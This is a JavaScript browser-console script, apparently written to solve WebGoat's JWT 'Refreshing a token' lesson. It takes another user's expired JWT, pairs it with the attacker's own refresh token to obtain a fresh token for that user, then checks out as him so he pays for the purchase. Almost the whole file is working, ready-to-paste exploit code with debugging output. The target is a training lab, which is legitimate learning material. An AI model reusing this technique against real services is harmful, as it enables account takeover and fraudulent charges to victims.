// ═══════════════════════════════════════════════════════════
// JWT REFRESH TOKEN ATTACK - STEP 2 (WITH DEBUGGING)
// Paste this in Console AFTER running Step 1
// ═══════════════════════════════════════════════════════════

(async function() {
    console.clear();
    console.log('%c═══════════════════════════════════════════════════════', 'color: cyan; font-size: 14px');
    console.log('%c    JWT REFRESH TOKEN ATTACK - STEP 2', 'color: yellow; font-size: 18px; font-weight: bold');
    console.log('%c═══════════════════════════════════════════════════════', 'color: cyan; font-size: 14px');
    
    console.log('\n%c[DEBUG] Starting attack script...', 'color: gray');
    
    // Tom's expired token from the log
    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
    
    console.log('%c[DEBUG] Checking for refresh token...', 'color: gray');
    
    // Check if Step 1 was run
    if (typeof window.myRefreshToken === 'undefined') {
        console.log('%c❌ ERROR: window.myRefreshToken is not defined!', 'color: red; font-size: 16px; font-weight: bold; background: #ffcccc; padding: 10px');
        console.log('\n%c⚠️ You need to run STEP 1 first!', 'color: orange; font-size: 14px; font-weight: bold');
        console.log('\nOptions:');
        console.log('1. Run the Step 1 script to find your refresh token');
        console.log('2. OR manually set it: window.myRefreshToken = "your_token_here"');
        console.log('\nIf you got your refresh token from Network tab:');
        console.log('   window.myRefreshToken = "paste_your_refresh_token_here";');
        console.log('   Then re-run this script.');
        return;
    }
    
    const MY_REFRESH_TOKEN = window.myRefreshToken;
    
    if (!MY_REFRESH_TOKEN || MY_REFRESH_TOKEN === '') {
        console.log('%c❌ ERROR: Refresh token is empty!', 'color: red; font-size: 16px; font-weight: bold');
        console.log('window.myRefreshToken:', MY_REFRESH_TOKEN);
        return;
    }
    
    console.log('%c✓ Refresh token found!', 'color: green; font-weight: bold');
    console.log('Token length:', MY_REFRESH_TOKEN.length);
    console.log('Token preview:', MY_REFRESH_TOKEN.substring(0, 30) + '...');
    
    // Decode Tom's token
    console.log('\n%c[STEP 1] Tom\'s Expired Token (from log)', 'color: cyan; font-size: 16px; font-weight: bold');
    
    try {
        const tomPayload = JSON.parse(atob(TOMS_EXPIRED_TOKEN.split('.')[1]));
        console.table(tomPayload);
        console.log('%cStatus: EXPIRED (but still cryptographically valid)', 'color: orange; font-weight: bold');
    } catch (e) {
        console.error('Failed to decode Tom\'s token:', e);
    }
    
    console.log('\n%c[STEP 2] Your Refresh Token', 'color: cyan; font-size: 16px; font-weight: bold');
    console.log('Token:', MY_REFRESH_TOKEN.substring(0, 50) + '...');
    console.log('Length:', MY_REFRESH_TOKEN.length, 'characters');
    
    // THE ATTACK
    console.log('\n%c[STEP 3] ⚡ Executing Refresh Token Manipulation Attack...', 'color: red; font-size: 16px; font-weight: bold');
    console.log('%cVulnerability: Server doesn\'t check token ownership!', 'background: yellow; color: black; padding: 5px; font-weight: bold');
    
    console.log('\nSending malicious refresh request:');
    console.log('  URL: /WebGoat/JWT/refresh/newToken');
    console.log('  Method: POST');
    console.log('  Authorization: Bearer <Tom\'s EXPIRED token>');
    console.log('  Body: {"refresh_token": "<YOUR refresh token>"}');
    
    try {
        console.log('\n%c[DEBUG] Making fetch request...', 'color: gray');
        
        const refreshResp = await fetch('/WebGoat/JWT/refresh/newToken', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                refresh_token: MY_REFRESH_TOKEN
            })
        });
        
        console.log('%c[DEBUG] Response received:', 'color: gray');
        console.log('  Status:', refreshResp.status, refreshResp.statusText);
        console.log('  OK:', refreshResp.ok);
        console.log('  Content-Type:', refreshResp.headers.get('content-type'));
        
        if (!refreshResp.ok) {
            console.log('%c❌ Refresh request failed!', 'color: red; font-size: 16px; font-weight: bold');
            console.log('HTTP Status:', refreshResp.status, refreshResp.statusText);
            
            const responseText = await refreshResp.text();
            console.log('\nResponse body:');
            console.log(responseText);
            
            if (refreshResp.status === 401) {
                console.log('\n%c⚠️ 401 Unauthorized - Possible reasons:', 'color: orange; font-weight: bold');
                console.log('1. Refresh token is expired or invalid');
                console.log('2. Tom\'s token format is not accepted');
                console.log('3. Server requires different authentication');
                console.log('\nTry getting a fresh refresh token from the lesson page.');
            } else if (refreshResp.status === 404) {
                console.log('\n%c⚠️ 404 Not Found - The endpoint doesn\'t exist', 'color: orange; font-weight: bold');
                console.log('Make sure you are on the "Refreshing a token" lesson page.');
            } else if (refreshResp.status === 400) {
                console.log('\n%c⚠️ 400 Bad Request - Invalid request format', 'color: orange; font-weight: bold');
                console.log('The refresh_token might be in wrong format.');
            }
            
            return;
        }
        
        // Parse response
        console.log('\n%c[DEBUG] Parsing JSON response...', 'color: gray');
        const refreshData = await refreshResp.json();
        console.log('Response data:', refreshData);
        
        if (!refreshData.access_token) {
            console.log('%c❌ No access_token in response!', 'color: red; font-size: 16px; font-weight: bold');
            console.log('Response:', refreshData);
            return;
        }
        
        const tomsNewToken = refreshData.access_token;
        
        console.log('\n%c✅ SUCCESS! Got Tom\'s NEW Token!', 'color: white; background: green; font-size: 18px; font-weight: bold; padding: 10px');
        console.log('\nNew Token:', tomsNewToken);
        
        // Decode and verify
        console.log('\n%c[DEBUG] Decoding new token...', 'color: gray');
        try {
            const decoded = JSON.parse(atob(tomsNewToken.split('.')[1]));
            console.log('\n%cNew Token Payload:', 'color: yellow; font-weight: bold');
            console.table(decoded);
            
            if (decoded.user === 'Tom') {
                console.log('%c✅ User is Tom! Attack worked!', 'color: green; font-size: 16px; font-weight: bold');
            } else {
                console.log('%c⚠️ User is NOT Tom:', decoded.user, 'color: orange; font-size: 16px; font-weight: bold');
                console.log('The attack may not have worked as expected.');
            }
        } catch (e) {
            console.error('Failed to decode new token:', e);
        }
        
        // CHECKOUT AS TOM
        console.log('\n%c[STEP 4] 🛒 Checking out as Tom...', 'color: cyan; font-size: 16px; font-weight: bold');
        console.log('Sending checkout request with Tom\'s new token...');
        
        console.log('\n%c[DEBUG] Making checkout request...', 'color: gray');
        
        const checkoutResp = await fetch('/WebGoat/JWT/refresh/checkout', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + tomsNewToken,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
        
        console.log('%c[DEBUG] Checkout response:', 'color: gray');
        console.log('  Status:', checkoutResp.status, checkoutResp.statusText);
        
        const checkoutData = await checkoutResp.json();
        console.log('\nCheckout Response:');
        console.log(checkoutData);
        
        if (checkoutData.lessonCompleted === true) {
            console.log('\n%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
            console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS! 💰', 'color: white; background: green; font-size: 20px; font-weight: bold; padding: 10px');
            console.log('%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
            
            console.log('\n%cChallenge Complete!', 'color: green; font-size: 18px; font-weight: bold');
            console.log('Tom\'s credit card: -$31.53 📉');
            console.log('Your wallet: Saved! 💵');
            console.log('WebGoat lesson: PWNED ✅');
            
        } else {
            console.log('\n%c⚠️ Checkout completed but lesson not marked as done', 'color: orange; font-size: 16px; font-weight: bold');
            console.log('Feedback:', checkoutData.feedback);
            console.log('Full response:', checkoutData);
            
            if (checkoutData.feedback && checkoutData.feedback.includes('Jerry')) {
                console.log('\n%c❌ Token still has user=Jerry!', 'color: red; font-weight: bold');
                console.log('The refresh token manipulation attack did not work.');
                console.log('The server might be validating token ownership correctly.');
            }
        }
        
        // Save for manual testing
        window.tomsNewToken = tomsNewToken;
        console.log('\n%c💡 Token saved to window.tomsNewToken for manual testing', 'color: blue; font-weight: bold');
        
    } catch (error) {
        console.log('\n%c❌ SCRIPT ERROR!', 'color: red; font-size: 18px; font-weight: bold; background: #ffcccc; padding: 10px');
        console.error('Error details:', error);
        console.log('\nError message:', error.message);
        console.log('Error stack:', error.stack);
        
        console.log('\n%c🔍 Debugging Information:', 'color: orange; font-weight: bold');
        console.log('1. Make sure you are on: http://192.168.254.112:8001/WebGoat/JWT');
        console.log('2. Make sure you are on the "Refreshing a token" lesson');
        console.log('3. Check that window.myRefreshToken is set correctly');
        console.log('4. Open Network tab (F12) to see actual HTTP errors');
        console.log('5. Try running Step 1 again to get a fresh refresh token');
    }
    
    console.log('\n%c═══════════════════════════════════════════════════════', 'color: cyan; font-size: 14px');
    console.log('%c    Script execution completed', 'color: gray; font-style: italic');
    console.log('%c═══════════════════════════════════════════════════════', 'color: cyan; font-size: 14px');
    
})();
